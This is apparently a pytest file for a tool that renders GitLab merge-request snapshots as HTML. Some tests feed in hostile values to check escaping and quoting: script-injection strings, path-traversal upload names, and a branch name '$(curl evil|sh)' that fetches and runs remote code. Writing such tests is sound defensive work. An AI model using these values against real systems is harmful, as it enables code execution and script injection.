import json
from datetime import datetime
from io import StringIO

import pytest
from conftest import UPLOAD_ID, mr, note

from mr_export import snapshot
from mr_export.fetch import fetch
from mr_export.render import render
from mr_export.runner import Console, Runner


@pytest.fixture
def snap(gitlab, tmp_path):
    runner = Runner(tmp_path, Console(StringIO()), run=gitlab)
    result = fetch(runner, Console(StringIO()), tmp_path, "opened", True, datetime(2026, 10, 23, 10, 5))
    render(snapshot.load(result.path))
    return result.path


def test_index_lists_every_mr_with_its_state(snap):
    html = (snap / "index.html").read_text()
    assert 'href="mr/2.html"' in html and 'href="mr/1.html"' in html
    assert html.index("!2") < html.index("!1")                   # newest first
    assert "approved (carol)" in html and "0/1" in html
    assert '<span class="pill warn">1</span>' in html            # one open thread on !2


def test_mr_page_shows_threads_with_file_and_line(snap):
    html = (snap / "mr" / "2.html").read_text()
    assert "<code>app/views.py:42</code>" in html and "open</span>" in html
    assert "Activity (1)" in html and "assigned to @bob" in html
    assert "git diff origin/dev...origin/mr/2" in html


def test_downloaded_images_are_shown_from_the_snapshot(snap):
    html = (snap / "mr" / "2.html").read_text()
    assert f'src="../uploads/{UPLOAD_ID}/a.png"' in html
    assert f'src="../uploads/{UPLOAD_ID}/screen%20one.png"' in html


def test_missing_image_links_to_gitlab_instead(snap):
    (snap / "uploads" / UPLOAD_ID / "a.png").unlink()
    render(snapshot.load(snap))
    html = (snap / "mr" / "2.html").read_text()
    assert f'href="https://git.example.org/team/app/uploads/{UPLOAD_ID}/a.png"' in html
    assert "image not in snapshot" in html


def legacy(tmp_path, items, details=None):
    (tmp_path / "mrs-list.ndjson").write_text("".join(json.dumps(m) + "\n" for m in items))
    for m in details or []:
        (tmp_path / f"mr-{m['iid']}.json").write_text(json.dumps(m))
    return snapshot.load(tmp_path)


def test_text_from_gitlab_is_escaped(tmp_path):
    evil = mr(5, title="<script>alert(1)</script>",
              description="<img src=x onerror=alert(1)> [x](javascript:alert(1)) **bold**")
    render(legacy(tmp_path, [evil], [evil]))
    html = (tmp_path / "mr" / "5.html").read_text() + (tmp_path / "index.html").read_text()
    assert "<script>alert" not in html and "<img src=x" not in html
    assert 'href="javascript:' not in html
    assert "<strong>bold</strong>" in html


def test_code_blocks_keep_their_content_literally(tmp_path):
    m = mr(6, description="Before\n```bash\necho **not bold** <tag>\n```\nAfter")
    render(legacy(tmp_path, [m], [m]))
    html = (tmp_path / "mr" / "6.html").read_text()
    assert "<pre><code>echo **not bold** &lt;tag&gt;</code></pre>" in html


def test_flat_hand_made_snapshot_renders_without_meta(tmp_path):
    snap = legacy(tmp_path, [mr(7)], [mr(7)])
    assert snap.meta["project"] == "team/app"
    render(snap)
    html = (tmp_path / "index.html").read_text()
    assert "team/app" in html and "unknown" in html               # no approvals file: said so


def test_note_links_relative_to_gitlab_get_the_host(tmp_path):
    m = mr(8, description="[pipeline](/team/app/-/pipelines/9)")
    render(legacy(tmp_path, [m], [m]))
    assert 'href="https://git.example.org/team/app/-/pipelines/9"' in (tmp_path / "mr" / "8.html").read_text()


def test_unsafe_upload_names_are_never_resolved(tmp_path):
    assert not snapshot.safe_upload(UPLOAD_ID, "..")
    assert not snapshot.safe_upload(UPLOAD_ID, "..%2F..%2Fetc")
    assert not snapshot.safe_upload("short", "a.png")
    m = snapshot.MergeRequest(data={"iid": 1, "description": f"![x](/uploads/{UPLOAD_ID}/..%2Fsecret)"},
                              discussions=[{"notes": [note(f"![y](/uploads/{UPLOAD_ID}/ok.png)")]}])
    assert snapshot.upload_refs(m) == [(UPLOAD_ID, "ok.png")]


def test_branch_names_in_git_commands_are_shell_quoted(tmp_path):
    m = mr(9, target_branch="$(curl evil|sh)")
    render(legacy(tmp_path, [m], [m]))
    html = (tmp_path / "mr" / "9.html").read_text()
    assert "git diff &#x27;origin/$(curl evil|sh)&#x27;...origin/mr/9" in html


def test_upload_links_that_are_not_images_use_the_local_copy(snap):
    (snap / "uploads" / UPLOAD_ID / "report.pdf").write_bytes(b"%PDF")
    data = json.loads((snap / "mr" / "1.json").read_text())
    data["description"] = f"[report](/uploads/{UPLOAD_ID}/report.pdf)"
    (snap / "mr" / "1.json").write_text(json.dumps(data))
    render(snapshot.load(snap))
    assert f'href="../uploads/{UPLOAD_ID}/report.pdf"' in (snap / "mr" / "1.html").read_text()


def test_unfinished_read_is_flagged_and_skipped_as_newest(snap, tmp_path):
    from mr_export.cli import newest_snapshot
    meta = json.loads((snap / "meta.json").read_text())
    meta["complete"] = False
    (snap / "meta.json").write_text(json.dumps(meta))
    render(snapshot.load(snap))
    assert "This read did not finish" in (snap / "index.html").read_text()
    assert newest_snapshot(snap.parent) is None


def test_null_fields_from_gitlab_do_not_crash(tmp_path):
    m = mr(10, labels=None, title=None, author=None, reviewers=None, head_pipeline=None)
    (tmp_path / "mr").mkdir()
    (tmp_path / "mr" / "10-approvals.json").write_text(json.dumps({"approved_by": None, "approvals_left": 1}))
    render(legacy(tmp_path, [m], [m]))
    assert (tmp_path / "mr" / "10.html").is_file()


def test_failed_mr_page_says_so(gitlab, tmp_path):
    gitlab.fail.add("projects/:id/merge_requests/2/approvals")
    runner = Runner(tmp_path, Console(StringIO()), run=gitlab)
    result = fetch(runner, Console(StringIO()), tmp_path, "opened", True, datetime(2026, 10, 23, 10, 5))
    render(snapshot.load(result.path))
    assert "Not all data of this merge request" in (result.path / "mr" / "2.html").read_text()
    assert "Not all data" not in (result.path / "mr" / "1.html").read_text()


def with_meta(tmp_path, items, meta=None, git=None):
    s = legacy(tmp_path, items, items)
    if meta is not None:
        (tmp_path / "meta.json").write_text(json.dumps(meta))
    if git is not None:
        (tmp_path / "git.json").write_text(json.dumps(git))
    return snapshot.load(tmp_path)


def row_order(html):
    import re
    return [int(x) for x in re.findall(r'<tr data-iid="(\d+)"', html)]


def test_order_non_drafts_then_top_labels_then_updated(tmp_path):
    items = [
        mr(1, draft=True, labels=["Approval ready"], updated_at="2026-10-05T00:00:00Z"),
        mr(2, labels=[], updated_at="2026-10-01T00:00:00Z"),
        mr(3, labels=["Approval ready"], updated_at="2026-10-02T00:00:00Z"),
        mr(4, labels=[], updated_at="2026-10-04T00:00:00Z"),
    ]
    render(with_meta(tmp_path, items))
    assert row_order((tmp_path / "index.html").read_text()) == [3, 4, 2, 1]


def test_custom_top_labels(tmp_path):
    items = [mr(1, labels=["Urgent"], updated_at="2026-10-01T00:00:00Z"),
             mr(2, labels=["Approval ready"], updated_at="2026-10-02T00:00:00Z")]
    render(with_meta(tmp_path, items), top_labels=["Urgent"])
    assert row_order((tmp_path / "index.html").read_text()) == [1, 2]


def test_chip_per_label_with_count(tmp_path):
    items = [mr(1, labels=["URGENT"]), mr(2, labels=["URGENT", "Docs"]), mr(3, labels=[])]
    render(with_meta(tmp_path, items))
    html = (tmp_path / "index.html").read_text()
    assert 'data-filter="label:URGENT">URGENT <span class="count">2</span>' in html
    assert 'data-filter="label:Docs">Docs <span class="count">1</span>' in html
    for special in ("draft", "intarget", "threads"):
        assert f'data-filter="{special}"' in html
    assert 'data-labels="URGENT|Docs"' in html


def test_in_target_column_texts(tmp_path):
    items = [mr(i) for i in range(1, 6)]
    git = {"1": {"target": "yes", "emergency": None, "emergency_branch": None},
           "2": {"target": "content", "emergency": None, "emergency_branch": None},
           "3": {"target": "no", "emergency": None, "emergency_branch": None},
           "4": {"target": "unknown", "emergency": None, "emergency_branch": None},
           "5": {"target": "no", "emergency": "content", "emergency_branch": "notfall/dev"}}
    render(with_meta(tmp_path, items, git=git))
    html = (tmp_path / "index.html").read_text()
    import re
    cells = dict(re.findall(r'<tr data-iid="(\d+)".*?<td class="intarget">(.*?)</td>', html))
    assert "yes" in cells["1"] and "squashed" not in cells["1"]
    assert "yes (squashed)" in cells["2"]
    assert cells["3"] == "no"
    assert "?" in cells["4"]
    assert "in notfall/dev" in cells["5"]


def test_age_banner_has_timestamp_and_threshold(tmp_path):
    meta = {"fetched_at": "2026-10-23T10:05:00", "complete": True, "partial": True,
            "failures": ["git: timeout"], "project": "team/app"}
    render(with_meta(tmp_path, [mr(1)], meta=meta), stale_after_hours=3)
    html = (tmp_path / "index.html").read_text()
    assert 'data-fetched="2026-10-23T10:05:00"' in html and 'data-stale-hours="3"' in html
    assert "Some data could not be read" in html


def test_no_git_json_still_renders(tmp_path):
    render(with_meta(tmp_path, [mr(1)]))
    html = (tmp_path / "index.html").read_text()
    assert '<td class="intarget"><span class="muted">?</span></td>' in html


def test_mr_page_has_changes_panel(tmp_path):
    with_meta(tmp_path, [mr(1)])
    (tmp_path / "mr").mkdir(exist_ok=True)
    (tmp_path / "mr" / "1.diff").write_text(
        "diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n@@ -0,0 +1 @@\n+print(1)\n")
    render(snapshot.load(tmp_path))
    html = (tmp_path / "mr" / "1.html").read_text()
    assert "<h2>Changes" in html and '<span class="add">+print(1)</span>' in html


def test_mr_page_without_diff_says_so(tmp_path):
    render(with_meta(tmp_path, [mr(1)]))
    assert "No diff in this snapshot" in (tmp_path / "mr" / "1.html").read_text()


def test_images_load_without_waiting_for_scroll(snap):
    html = (snap / "mr" / "2.html").read_text()
    assert "<img " in html and 'loading="lazy"' not in html


def test_conflict_state_is_shown_as_unclear(tmp_path):
    git = {"1": {"target": "conflict", "emergency": None, "emergency_branch": None}}
    render(with_meta(tmp_path, [mr(1)], git=git))
    html = (tmp_path / "index.html").read_text()
    assert "unclear" in html and 'data-intarget="0"' in html
